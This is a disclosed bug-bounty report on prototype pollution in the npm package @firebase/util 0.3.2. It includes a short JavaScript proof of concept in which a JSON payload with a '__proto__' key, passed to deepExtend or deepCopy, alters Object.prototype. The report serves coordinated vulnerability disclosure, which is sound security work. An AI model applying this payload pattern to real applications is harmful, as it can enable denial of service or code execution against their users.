# [@firebase/util] Prototype pollution

## Report Details
- **Report ID**: 1001218
- **URL**: https://hackerone.com/reports/1001218
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-10-07T15:00:05.559Z
- **Disclosed**: 2020-11-17T17:42:42.628Z

## Reporter
- **Username**: d3lla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
# Module

**module name:** `@firebase/util`
**version:** `0.3.2`
**npm page:** `https://www.npmjs.com/package/@firebase/util`

## Module Description

NOTE: This is specifically tailored for Firebase JS SDK usage, if you are not a member of the Firebase team, please avoid using this package

This is a wrapper of some Webchannel Features for the Firebase JS SDK.

## Module Stats

[1,516,157] weekly downloads

# Vulnerability

## Vulnerability Description

I tested the [`deepCopy`](https://github.com/firebase/firebase-js-sdk/blob/master/packages/util/src/deepCopy.ts) and [`deepExtend`](https://github.com/firebase/firebase-js-sdk/blob/master/packages/util/src/deepCopy.ts) functions.

The `deepCopy` and `deepExtend` functions can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `@firebase/util` module:
    - `npm i ``@firebase/util`

Run the following poc:
```javascript
const utils = require('@firebase/util');

const obj = {};
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
console.log("Before : " + obj.polluted);
utils.deepExtend({}, source);
// utils.deepCopy(source);
console.log("After : " + obj.polluted);

```
Output:
```console

Before : undefined
After : yes
```
{F1024346}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.11.0
- NPM VERSION: 6.14.8

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Attachments
- firebase_util_poc.mov
